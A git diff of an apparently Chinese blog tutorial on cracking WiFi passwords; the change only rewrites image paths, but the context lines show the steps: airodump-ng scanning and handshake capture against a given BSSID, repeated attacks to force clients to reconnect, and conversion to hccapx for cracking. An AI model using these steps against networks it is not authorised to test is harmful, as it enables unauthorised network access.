@@ -36,13 +36,13 @@ categories:
 
 3. `ifconfig -a`看当前无线网卡名称是wlan0还是wlan0mon(有些网卡会在这时候变成wlan0mon，如果变了那么下面的wlan0就写wlan0mon)
 4. `airodump-ng wlan0/wlan0mon` 扫描wifi，记录目标的BSSID和CH(信道)
-    ![image](../public/image-20250404191250-b5e8thw.png)
+    ![image](/破解WIFI密码学习/image-20250404191250-b5e8thw.png)
 5. `airodump-ng -w 保存握手包的文件名 -c 信道(CH) --bssid D6:93:51:05:7A:5C wlan0/wlan0mon`
 
     例如:`airodump-ng -w test -c 1 --bssid D6:93:51:05:7A:5C wlan0`
 
     记录下面两个数据，第一个是路由器地址(和上一步的一样)，第二个是客户端地址
-    ![image](../public/image-20250404192722-gwvrdvz.png)
+    ![image](/破解WIFI密码学习/image-20250404192722-gwvrdvz.png)
 
     Tips:按Space暂停/继续,后方便复制
 
@@ -54,7 +54,7 @@ categories:
 
     可以多攻击几次，让目标设备重连网络，获取握手包
 7. 看之前的终端，出现handshake则成功
-    ![image](../public/image-20250404193110-umugp3h.png)
+    ![image](/破解WIFI密码学习/image-20250404193110-umugp3h.png)
 8. 转换成`hccapx`格式
 
     `hcxpcapngtool -o 输出文件名.hccapx 握手包名.cap`
